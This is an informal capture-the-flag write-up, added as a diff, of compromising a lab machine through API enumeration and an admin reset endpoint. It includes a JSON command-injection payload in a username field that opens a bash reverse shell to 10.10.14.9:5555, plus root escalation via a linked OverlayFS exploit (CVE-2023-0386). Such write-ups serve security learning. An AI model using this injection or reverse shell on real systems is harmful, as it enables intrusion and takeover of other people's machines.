@@ -1,0 +1,40 @@
+we looked all over and nothing to get a start on
+
+but there was an invite code so we loked at js file adn we found an endpoint to post a request to get invite code
+
+we logged in with new email and pass
+
+now there was a link to generate openvpn , regenrate
+
+we loked at burp for regenrate and found it was hitting api v1/auth/user/admin..
+
+we went back one at a time v1/auth/user .. then v1/auth .. we hit soemthing which gave us all the endpoints
+
+we loked at /admin/reset and we gave it the parameters and got our mail as admin
+
+now there was another endpoint which help us generate /admin/openvpn
+
+but no matter what we give it the username it generates .. so we execute a shell and got in
+
+```
+{
+"username":"a$(bash -c 'bash -i >& /dev/tcp/10.10.14.9/5555 0>&1')"
+}
+
+
+content-tye: application/json
+```
+
+we ran
+
+`find / -user username 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'`
+
+to eleminate run,proc,sys from finding
+
+and got a /var/mail it suggested  Overlay Exploit
+
+we ran a github exploit with 2 terminals and got root
+
+both using ssh not remote shell
+
+`https://github.com/xkaneiki/CVE-2023-0386`
